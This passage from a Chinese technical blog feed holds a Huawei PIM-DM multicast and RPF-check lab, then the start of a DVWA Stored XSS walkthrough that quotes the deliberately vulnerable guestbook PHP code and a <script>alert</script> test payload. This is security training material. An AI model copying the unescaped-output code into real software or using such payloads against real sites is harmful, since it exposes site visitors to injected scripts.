alt="zuboyuan1"></p><div><font size="4"><b>配置用户1</b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zuboyonghu1.jpg" alt="zuboyonghu1"></p><div><font size="4"><b>配置用户2</b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20230217132655325.png" alt="image-20230217132655325"></p><div><font size="4"><b>配置用户3</b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20230217132738201.png" alt="image-20230217132738201"></p><hr><h2 id="使能组播路由"><a href="#使能组播路由" class="headerlink" title="使能组播路由"></a>使能组播路由</h2><div><font size="4">接口下配置pim dm协议 </font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#配置AR1</span><br><span class="line">[R1]multicast routing-enable </span><br><span class="line">[R1]interface GigabitEthernet0/0/0</span><br><span class="line">[R1-GigabitEthernet0/0/0]pim dm </span><br><span class="line">[R1]interface GigabitEthernet0/0/1</span><br><span class="line">[R1-GigabitEthernet0/0/1]pim dm </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#配置AR2</span><br><span class="line">[R2]multicast routing-enable </span><br><span class="line">[R2]interface GigabitEthernet0/0/0</span><br><span class="line">[R2-GigabitEthernet0/0/0]pim dm </span><br><span class="line">[R2]interface GigabitEthernet0/0/1</span><br><span class="line">[R2-GigabitEthernet0/0/1]pim dm </span><br><span class="line">[R2]interface LoopBack0</span><br><span class="line">[R2-LoopBack0]pim dm </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#配置AR3</span><br><span class="line">[R3]multicast routing-enable </span><br><span class="line">[R3]interface GigabitEthernet0/0/0</span><br><span class="line">[R3-GigabitEthernet0/0/0]pim dm </span><br><span class="line">[R3]interface GigabitEthernet0/0/1</span><br><span class="line">[R3-GigabitEthernet0/0/1]pim dm </span><br><span class="line">[R3]interface LoopBack0</span><br><span class="line">[R3-LoopBack0]pim dm </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#配置AR4</span><br><span class="line">[R4]multicast routing-enable </span><br><span class="line">[R4]interface GigabitEthernet0/0/0</span><br><span class="line">[R4-GigabitEthernet0/0/0]pim dm </span><br><span class="line">[R4]interface GigabitEthernet0/0/1</span><br><span class="line">[R4-GigabitEthernet0/0/1]pim dm </span><br><span class="line">[R4]interface GigabitEthernet0/0/2</span><br><span class="line">[R4-GigabitEthernet0/0/2]pim dm </span><br><span class="line">[R4-GigabitEthernet0/0/2]igmp enable     //使能igmp协议</span><br><span class="line">[R4]interface LoopBack0</span><br><span class="line">[R4-LoopBack0]pim dm </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#配置AR5</span><br><span class="line">[R5]multicast routing-enable </span><br><span class="line">[R5]interface GigabitEthernet0/0/0</span><br><span class="line">[R5-GigabitEthernet0/0/0]pim dm </span><br><span class="line">[R5]interface GigabitEthernet0/0/1</span><br><span class="line">[R5-GigabitEthernet0/0/1]pim dm </span><br><span class="line">[R5]interface GigabitEthernet0/0/2</span><br><span class="line">[R5-GigabitEthernet0/0/2]pim dm </span><br><span class="line">[R5-GigabitEthernet0/0/2]igmp enable     //使能igmp协议</span><br><span class="line">[R5]interface LoopBack0</span><br><span class="line">[R5-LoopBack0]pim dm </span><br></pre></td></tr></table></figure><hr><h2 id="验证组播邻居"><a href="#验证组播邻居" class="headerlink" title="验证组播邻居"></a>验证组播邻居</h2><div><font size="4">通过命令`display pim  neighbor` 查看组播邻居是否建立成功</font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;R1&gt;display  pim neighbor </span><br><span class="line"> VPN-Instance: public net</span><br><span class="line"> Total Number of Neighbors = 2</span><br><span class="line"></span><br><span class="line"> Neighbor        Interface           Uptime   Expires  Dr-Priority  BFD-Session</span><br><span class="line"> 10.1.1.3        GE0/0/1             04:01:28 00:01:17 1            N          </span><br><span class="line"> 10.1.1.2        GE0/0/1             04:03:35 00:01:40 1            N          </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;R2&gt;display pim neighbor </span><br><span class="line"> VPN-Instance: public net</span><br><span class="line"> Total Number of Neighbors = 3</span><br><span class="line"></span><br><span class="line"> Neighbor        Interface           Uptime   Expires  Dr-Priority  BFD-Session</span><br><span class="line"> 24.1.1.4        GE0/0/0             04:00:00 00:01:44 1            N          </span><br><span class="line"> 10.1.1.3        GE0/0/1             04:01:49 00:01:26 1            N          </span><br><span class="line"> 10.1.1.1        GE0/0/1             04:03:55 00:01:34 1            N          </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;R3&gt;display pim neighbor </span><br><span class="line"> VPN-Instance: public net</span><br><span class="line"> Total Number of Neighbors = 3</span><br><span class="line"></span><br><span class="line"> Neighbor        Interface           Uptime   Expires  Dr-Priority  BFD-Session</span><br><span class="line"> 35.1.1.5        GE0/0/0             03:57:35 00:01:40 1            N          </span><br><span class="line"> 10.1.1.2        GE0/0/1             04:02:00 00:01:36 1            N          </span><br><span class="line"> 10.1.1.1        GE0/0/1             04:01:59 00:01:21 1            N          </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;R4&gt;display  pim neighbor </span><br><span class="line"> VPN-Instance: public net</span><br><span class="line"> Total Number of Neighbors = 3</span><br><span class="line"></span><br><span class="line"> Neighbor        Interface           Uptime   Expires  Dr-Priority  BFD-Session</span><br><span class="line"> 24.1.1.2        GE0/0/0             04:00:27 00:01:18 1            N          </span><br><span class="line"> 45.1.1.5        GE0/0/1             03:58:00 00:01:16 1            N          </span><br><span class="line"> 10.1.2.5        GE0/0/2             03:57:44 00:01:31 1            N          </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;R5&gt;display pim  neighbor </span><br><span class="line"> VPN-Instance: public net</span><br><span class="line"> Total Number of Neighbors = 3</span><br><span class="line"></span><br><span class="line"> Neighbor        Interface           Uptime   Expires  Dr-Priority  BFD-Session</span><br><span class="line"> 35.1.1.3        GE0/0/0             03:54:42 00:01:33 1            N          </span><br><span class="line"> 45.1.1.4        GE0/0/1             03:54:53 00:01:29 1            N          </span><br><span class="line"> 10.1.2.6        GE0/0/2             03:54:40 00:01:37 1            N          </span><br></pre></td></tr></table></figure><h2 id="组播视频拉流验证"><a href="#组播视频拉流验证" class="headerlink" title="组播视频拉流验证"></a>组播视频拉流验证</h2><div class="tip warning faa-horizontal animated faa-fast"><p>必须安装VLC软件才可以使用！</p></div><p><a href="http://www.videolan.org/">VLC：官方网站 - 全平台的自由多媒体解决方案！ - VideoLAN</a></p><div><font size="4">准备好一份视频文件，放入组播源文件路径后点击运行，可以看到视频正在播放 </font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20230217134953954.png" alt="image-20230217134953954"></p><div><font size="4">双击用户打开后，进入组播，IGMP版本为V2，点击加入，启动VLC，出现画面说明拉取组播源成功！ </font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20230217135413576.png" alt="image-20230217135413576"></p><hr><h1 id="查看组播路由"><a href="#查看组播路由" class="headerlink" title="查看组播路由"></a>查看组播路由</h1><div><font size="4">在R4路由器查看组播路由表项</font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;R4&gt;display pim routing-table</span><br><span class="line"> VPN-Instance: public net</span><br><span class="line"> Total 1 (*, G) entry; 1 (S, G) entry</span><br><span class="line"></span><br><span class="line"> (*, 239.1.1.1)//（*，G）表项仅为父项</span><br><span class="line">     Protocol: pim-dm, Flag: WC </span><br><span class="line">     UpTime: 00:00:14</span><br><span class="line">     Upstream interface: NULL</span><br><span class="line">         Upstream neighbor: NULL</span><br><span class="line">         RPF prime neighbor: NULL</span><br><span class="line">     Downstream interface(s) information:</span><br><span class="line">     Total number of downstreams: 1</span><br><span class="line">         1: GigabitEthernet0/0/2</span><br><span class="line">             Protocol: igmp, UpTime: 00:00:14, Expires: never</span><br><span class="line"></span><br><span class="line"> (100.1.1.1, 239.1.1.1)</span><br><span class="line">     Protocol: pim-dm, Flag: ACT //使用的协议和Flag标识</span><br><span class="line">     UpTime: 00:06:39//建立时间</span><br><span class="line">     Upstream interface: GigabitEthernet0/0/0//上行接口，组播流到达的接收口，绝大部分只有一个</span><br><span class="line">         Upstream neighbor: 24.1.1.2//上行邻居</span><br><span class="line">         RPF prime neighbor: 24.1.1.2//RPF邻居</span><br><span class="line">     Downstream interface(s) information:</span><br><span class="line">     Total number of downstreams: 1//下游接口，组播流转发出去的接口，出接口列表（可以是多个接口）</span><br><span class="line">         1: GigabitEthernet0/0/2</span><br><span class="line">             Protocol: pim-dm, UpTime: 00:00:14, Expires: 00:00:09</span><br><span class="line"></span><br></pre></td></tr></table></figure><div><font size="4">在R5路由器查看组播路由表项</font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;R5&gt;display  pim routing-table</span><br><span class="line"> VPN-Instance: public net</span><br><span class="line"> Total 0 (*, G) entry; 1 (S, G) entry</span><br><span class="line"></span><br><span class="line"> (100.1.1.1, 239.1.1.1)</span><br><span class="line">     Protocol: pim-dm, Flag: </span><br><span class="line">     UpTime: 00:04:24</span><br><span class="line">     Upstream interface: GigabitEthernet0/0/0</span><br><span class="line">         Upstream neighbor: 35.1.1.3</span><br><span class="line">         RPF prime neighbor: 35.1.1.3</span><br><span class="line">     Downstream interface(s) information: None</span><br></pre></td></tr></table></figure><div><font size="4">可以看到，R5的Downstream interface(s) information为none，这说明R5触发了组播的剪枝现象，用户拉取视频是通过R4路由器进行转发</font></div><div><font size="4">组播源发送的组播报文会在全网内扩散。当PIM路由器接收到组播报文，先进行RPF检查，通过后会在该路由器上创建（S，G）表项，之后会向所有PIM邻居发送。</font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;R1&gt;display pim  routing-table</span><br><span class="line"> VPN-Instance: public net</span><br><span class="line"> Total 0 (*, G) entry; 1 (S, G) entry</span><br><span class="line"></span><br><span class="line"> (100.1.1.1, 239.1.1.1)</span><br><span class="line">     Protocol: pim-dm, Flag: LOC ACT </span><br><span class="line">     UpTime: 00:12:10</span><br><span class="line">     Upstream interface: GigabitEthernet0/0/0</span><br><span class="line">         Upstream neighbor: NULL</span><br><span class="line">         RPF prime neighbor: NULL</span><br><span class="line">     Downstream interface(s) information: None</span><br></pre></td></tr></table></figure><hr><h1 id="扩展知识点"><a href="#扩展知识点" class="headerlink" title="扩展知识点"></a>扩展知识点</h1><div><font size="4">密集模式会进行泛洪处理</font></div><div><font size="4">周期性的扩散和剪枝现象是密集模式协议的特征</font></div><div><font size="4">组播数据转发需要<font color="red"><b>依赖组播分发树</font></b>，因此组播路由器需要通过协议来<font color="red"><b>构建组播分发树</b></font>。</font></div><div><font size="4">组播分发树：用来描述IP组播报文在网络中经过的路径</font></div><div><font size="4">组播分发树的两个基本类型：</font></div><ul><li><div><font size="4">源路径树（SPT）</font></div><ul><li><div><font size="4">以组播源作为树根，将组播源到每一个接收者的最短路径结合起来构成的转发树。</font></div></li></ul></li><li><div><font size="4">共享树（RPT）</font></div><ul><li><div><font size="4">使用放在网络的某些节点的单独的公用根。根据组播路由协议，这个根通常被称为汇合点（RP）或者核心。</font></div></li></ul></li></ul><hr><h1 id="组播数据转发"><a href="#组播数据转发" class="headerlink" title="组播数据转发"></a>组播数据转发</h1><h2 id="RPF机制"><a href="#RPF机制" class="headerlink" title="RPF机制"></a>RPF机制</h2><div><font size="4">组播路由使用 “反向路径转发”机制(RPF, Reverse Path Forwarding)</font></div><p><br></p><div><font size="4">RPF执行过程中会用到原有的单播路由表以确定上游和下游的邻接结点。只有当报文是从上游邻接结点对应的接口（称作 RPF 接口）到达时，才向下游转发。</font></div><p><br></p><div><font size="4">RPF 的作用除了可以正确地按照组播路由的配置转发报文外，还能避免由于各种原因造成的环路，环路避免在组播路由中是一个非常重要的问题。</font></div><blockquote><div><font size="4">RPF 的主体是 RPF 检查，路由器收到组播报文后，先对报文进行 RPF 检查，只有检查通过才转发，否则丢弃。RPF 检查过程如下：</font></div><div><font size="4">1、路由器在单播路由表中查找组播源或 RP 对应的 RPF 接口（当使用信源树时，查找组播源对应的 RPF 接口，使用共享树时查找 RP 对应的 RPF 接口），某个地址对应的 RPF 接口是指从路由器向该地址发送报文时的出接口；</font></div><div><font size="4">2、如果组播报文是从 RPF 接口接收下来的，则 RPF 检查通过，报文向下游接口转发；</font></div><div><font size="4">3、否则，丢弃该报文。</font></div></blockquote><div><font size="4"><b>简单理解为：在单播路由表中，到达源地址的出接口（下一跳）等于组播数据的入接口，则RPF成功；否则（到达源地址的出接口不等于组播数据的入接口）失败</b></font></div><hr><h2 id="RPF检查实验"><a href="#RPF检查实验" class="headerlink" title="RPF检查实验"></a>RPF检查实验</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#配置AR4</span><br><span class="line">[R4-GigabitEthernet0/0/0]undo pim dm    //删除0接口的pim邻居</span><br><span class="line">[R4]display multicast rpf-info 100.1.1.1//无信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#配置R5</span><br><span class="line">&lt;R5&gt;display multicast rpf-info 100.1.1.1</span><br><span class="line"> VPN-Instance: public net</span><br><span class="line"> RPF information about source: 100.1.1.1</span><br><span class="line">     RPF interface: GigabitEthernet0/0/0, RPF neighbor: 35.1.1.3//到达源地址的出接口（下一跳）</span><br><span class="line">     Referenced route/mask: 100.1.1.0/24</span><br><span class="line">     Referenced route type: unicast//参考的路由表为单播，还可以参考组播BGP和静态组播路由</span><br><span class="line">     Route selection rule: preference-preferred</span><br><span class="line">     Load splitting rule: disable</span><br><span class="line">     </span><br><span class="line">&lt;R5&gt;display pim routing-table</span><br><span class="line"> VPN-Instance: public net</span><br><span class="line"> Total 0 (*, G) entry; 1 (S, G) entry</span><br><span class="line"></span><br><span class="line"> (100.1.1.1, 239.1.1.1)</span><br><span class="line">     Protocol: pim-dm, Flag: ACT </span><br><span class="line">     UpTime: 00:03:52</span><br><span class="line">     Upstream interface: GigabitEthernet0/0/0//组播数据的入接口</span><br><span class="line">         Upstream neighbor: 35.1.1.3</span><br><span class="line">         RPF prime neighbor: 35.1.1.3</span><br><span class="line">     Downstream interface(s) information:</span><br><span class="line">     Total number of downstreams: 1</span><br><span class="line">         1: GigabitEthernet0/0/2</span><br><span class="line">             Protocol: pim-dm, UpTime: 00:03:25, Expires: never</span><br><span class="line">可以看到，RPF单播路由到达源地址的出接口等于组播数据的入接口</span><br></pre></td></tr></table></figure><div><font size="4">这个时候是可以成功拉取组播源视频的</font></div><div><font size="4">再做一个测试：通过静态的方式，指向到R4，更改下一跳接口，查看RPF的状态和用户是否能够成功拉取视频</font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#配置R5</span><br><span class="line">[R5]ip route-static 100.1.1.1 32 GigabitEthernet 0/0/1 preference 9</span><br><span class="line">下一跳出口指向与R4的互连接口，修改优先级大于ospf</span><br><span class="line">&lt;R5&gt;display multicast rpf-info 100.1.1.1</span><br><span class="line"> VPN-Instance: public net</span><br><span class="line"> RPF information about source: 100.1.1.1</span><br><span class="line">     RPF interface: GigabitEthernet0/0/1, RPF neighbor: 45.1.1.4//RPF的邻居为R4，出接口到了R4的G0/0/1</span><br><span class="line">     Referenced route/mask: 100.1.1.0/24</span><br><span class="line">     Referenced route type: unicast</span><br><span class="line">     Route selection rule: preference-preferred</span><br><span class="line">     Load splitting rule: disable</span><br></pre></td></tr></table></figure><div><font size="4">视频画面卡主，无法获取资源，RPF到达源地址的出接口不等于组播数据的入接口，所以失败</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20230217165144613.png" alt="image-20230217165144613"></p><hr><h2 id="华为RPF检查过程"><a href="#华为RPF检查过程" class="headerlink" title="华为RPF检查过程"></a>华为RPF检查过程</h2><div><font size="4">除单播路由外，MBGP路由、组播静态路由也是RPF检查的依据。当路由器收到一份组播报文后，如果这三种路由表都存在，具体检查过程如下：</font></div><div><font size="4">1、首先，通过报文源地址，分别从单播路由表、MBGP路由表和组播静态路由表中各选出一条最优路由。单播路由、MBGP路由的出接口为RPF接口，下一跳为RPF邻居。需要注意的是，组播静态路由实际上属于手工配置的组播路由，已经明确指定了RPF接口与RPF邻居。</font></div><div><font size="4">2、然后，根据以下原则从这三条最优路由中选择一条作为RPF路由。</font></div><blockquote><div><font size="4">如果配置了按照最长匹配选择路由，则从这三条路由中选出最长匹配的那条路由；如果这三条路由的掩码一样，则选择优先级最高的那条路由如果它们的优先级也相同，则按照组播静态路由、MBGP路由、单播路由的顺序进行选择。</font></div><div><font size="4">如果没有配置按照最长匹配选择路由，则从这三条路由中选出优先级最高的那条路由；如果它们的优先级相同，则按照组播静态路由、MBGP 路由、单播路由的顺序进行选择。</font></div></blockquote><div><font size="4">3、最后，路由器会将报文的入接口与RPF路由的RPF接口进行比较。如果一致则RPF检查通过，表明该报文来源路径正确，会将其向下游转发；如果不一致即RPF检查失败，表明该报文来源路径错误，就将其丢弃。</font></div><hr>]]></content>
      
      
      <categories>
          
          <category> 学习实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 组播 </tag>
            
            <tag> PIM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stored XSS</title>
      <link href="/posts/fb38257a/"/>
      <url>/posts/fb38257a/</url>
      
        <content type="html"><![CDATA[<div><font size="6"><b><center>通关DVWA全级别 Stored XSS</center></b></font></div><h1 id="存储型XSS原理"><a href="#存储型XSS原理" class="headerlink" title="存储型XSS原理"></a>存储型XSS原理</h1><div style="text-indent:2em;"><font size="4">存储型相比于反射型的XSS，时间更持久，可以在后台存储起来，危害更大。由攻击者输入恶意数据保存在数据库，再由服务器脚本程序从数据库中读取数据，然后显示在公共显示的固定页面上，那么所有浏览该页面的用户都会被攻击。该类型攻击性非常大，危险也非常大。由于攻击者输入恶意数据保存在数据库，再由服务器脚本程序从数据库中读取数据。</font></div><div class="tip faa-horizontal animated faa-fast"><div><font size="4">所以大部分的存储型XSS漏洞都是在表单提交上会发生的</font></div></div><h1 id="存储型XSS攻击过程"><a href="#存储型XSS攻击过程" class="headerlink" title="存储型XSS攻击过程"></a>存储型XSS攻击过程</h1><div style="text-indent:2em;"><font size="4">这种攻击多见于论坛、博客和留言板。攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端数据库中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到触发。</font></div><blockquote><div><font size="4">例如，攻击者在留言板中加入以下代码：&lt;script&gt;alert(1)&lt;/script&gt;</font></div></blockquote><div style="text-indent:2em;"><font size="4">这样当其他用户访问留言板时，就会看到一个弹窗。可以看到，存储型XSS的攻击方式能够将恶意代码永久地存入数据库或者文件中，相当于将代码嵌入一个页面中，所有访问这个页面的用户都将成为受害者。</font></div><div style="text-indent:2em;"><font size="4">如果我们能够谨慎对待不明链接，那么反射型XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入在一些我们非常信任的页面中，因此无论我们多么小心，都难免会受到攻击。</font></div><div style="text-indent:2em;"><font size="4">所以，存储型XSS的危害性更大，范围更广，可以不需要寻找被攻击对象，只要存储型XSS在服务器上就能实施攻击。所以提交的存储型XSS评级一般为中危漏洞。</font></div><hr><div><font size="6"><b><center>Vulnerability: Stored Cross Site Scripting (XSS)</center></b></font></div><h1 id="难度Low"><a href="#难度Low" class="headerlink" title="难度Low"></a>难度Low</h1><h2 id="页面源代码"><a href="#页面源代码" class="headerlink" title="页面源代码"></a>页面源代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><blockquote><div><font size="4">表单提交后name和message中的内容首先被trim函数移除左右两边的字符，再被stripslashes()函数删除反斜杠（\），然后经过mysqli_real_escape_string() 函数的处理，转义了特殊字符（包括NUL（ASCII 0）、\n、\r、\、'、" 和 Control-Z），然后直接代入mysqli_query()函数来执行INSERT INTO的SQL语句。</font></div><div><font size="4">完全没有对XSS的防护，另外对SQL注入的防护也不彻底。</font></div></blockquote><div style="text-indent:2em;"><font size="4">老规矩，首先在Message框直接输入最简单的payload：&lt;script&gt;alert(/这是一个XSS弹窗/)&lt;/script&gt;测试是否存在XSS漏洞</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220929172649551.png" alt="image-20220929172649551"></p><div style="text-indent:2em;"><font size="4">刷新界面查看效果</font></div><div class="video"><video controls preload><source src='https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/xss.mp4' type='video/mp4'>Your browser does not support the video tag.</video></div><div style="text-indent:2em;"><font size="4">然后测试在Name框输入payload：&lt;script&gt;alert(/这是一个XSS弹窗/)&lt;/script&gt;</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20220929173824775.png" alt="image-20220929173824775"></p><div style="text-indent:2em;"><font size="4">出现长度限制！查看分析界面Html代码后发现，输入框做了长度限制</font></div><p><img 